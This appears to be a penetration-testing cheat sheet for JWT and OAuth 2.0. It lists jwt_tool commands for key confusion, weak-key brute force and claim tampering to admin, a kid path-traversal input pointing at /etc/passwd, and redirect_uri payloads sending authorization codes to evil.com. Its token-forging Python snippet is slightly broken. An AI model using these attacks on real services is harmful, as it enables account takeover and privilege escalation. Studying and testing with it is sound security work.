# JWT + OAuth 2.0 Security Testing

## JWT Attack Surface

### 1. Algorithm Confusion

```bash
# alg:none — the classic
# Original: {"alg":"RS256","typ":"JWT"}.payload.signature
# Attack:   {"alg":"none","typ":"JWT"}.payload.  (empty signature)

# RS256 → HS256 key confusion
# If the server validates HS256 with the RS256 public key,
# you can sign tokens using the public key as the HMAC key
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid injection
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# The server uses the content of the file pointed to by kid as the HMAC key
```

### 2. jwt_tool Complete Usage

```bash
# Full scan
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# Weak-key brute force
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Claim tampering
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# RSA key confusion
python3 jwt_tool.py <JWT> -X k -pk public.pem

# Embedded JWK
python3 jwt_tool.py <JWT> -X i
```

### 3. Manual JWT Tampering

```python
import jwt
import base64

# Decode (without verification)
header, payload, sig = jwt.split('.')

# Tamper with the payload
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# HS256 with known key
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 Attack Surface

### Authorization Code Grant

```text
1. redirect_uri manipulation
   Normal: https://app.com/callback?code=AUTH_CODE
   Attack: https://app.com/callback@evil.com?code=AUTH_CODE
           https://evil.com/?redirect=https://app.com/callback?code=AUTH_CODE
           Open redirect + redirect_uri: https://app.com/callback?redirect=https://evil.com

2. CSRF via missing state
   No state parameter → attacker binds the victim's session to their own code

3. Missing PKCE
   No code_challenge → authorization code interception attack

4. Token leaked in Referer
   Callback page loads an external resource → Referer header carries code/token
```

### Implicit Grant (deprecated but still deployed)

```text
1. access_token in URL fragment → Referer leak
2. Token in browser history → physical-access risk
3. No client authentication → token substitution attack
```

### Client Credentials Grant

```text
1. client_secret leak (hardcoded in frontends/mobile apps)
2. Over-broad scope grants
3. No per-client rate limiting → brute force enumeration
```

### General OAuth Tests

```text
□ Test scope escalation: scope=read → scope=read%20write
□ Token replay: use an old access_token against new resources
□ Refresh token abuse: renew refresh_token indefinitely
□ Cross-tenant access: token of tenant A used against tenant B
□ Token leaked in logs/URLs/Referer
```

## Tools

```bash
# JWT testing
pip install jwt-tool pyjwt

# OAuth testing
# Burp Suite + OAuth Scanner extension
# Postman OAuth 2.0 flow testing

# Automation
# Entropy: automatic JWT tampering + OAuth redirect_uri testing
```

Source: OWASP API Top 10 (API2: Broken Authentication), jwt_tool, PortSwigger OAuth research
